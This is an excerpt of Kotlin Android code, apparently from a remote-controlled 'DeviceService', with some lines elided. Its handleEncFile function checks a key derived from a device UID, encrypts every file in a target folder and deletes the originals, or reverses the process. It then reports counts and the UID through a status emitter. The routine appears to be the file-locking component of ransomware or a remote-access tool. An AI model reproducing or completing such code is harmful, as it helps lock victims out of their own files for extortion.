...
private fun handleEncFile(value: String) {
    try {
        ...
        // 🔥 VALIDASI KUNCI DARI UID
        if (key.isEmpty() || key.length < 16) {
            Log.e("DeviceService", "ENC: Kunci tidak valid! (min 16 karakter)")
            emitStatus(JSONObject().apply { 
                put("encError", "Kunci tidak valid! UID tidak ditemukan")
                put("encActive", false)
            })
            return
        }
        ...
        Thread {
            try {
                ...
                val files = folder.listFiles() ?: return@Thread
                var processed = 0
                var failed = 0
                ...
                files.forEach { file ->
                    ...
                    try {
                        when (action) {
                            "encrypt" -> {
                                if (!file.name.endsWith(".enc")) {
                                    ...
                                    if (FileCryptoManager.encryptFile(file, encFile, key)) {
                                        file.delete()
                                        processed++
                                    } else {
                                        failed++
                            ...
                            "decrypt" -> {
                                if (file.name.endsWith(".enc")) {
                                    ...
                                    if (FileCryptoManager.decryptFile(file, originalFile, key)) {
                                        file.delete()
                                        processed++
                                    } else {
                                        failed++
                        ...
                        Log.e("DeviceService", "ENC file error: ${e.message}")
                        failed++
                    }
                }
                ...
                Handler(Looper.getMainLooper()).post {
                    emitStatus(JSONObject().apply {
                        put("encActive", finalAction == "encrypt")
                        put("encAction", finalAction)
                        put("encPath", path)
                        put("encProcessed", finalProcessed)
                        put("encFailed", finalFailed)
                        put("encUid", uid)
                        put("encComplete", true) // 🔥 TANDA PROSES SELESAI
                    })
                }
                
                Log.d("DeviceService", "ENC $action: $processed files, $failed failed")
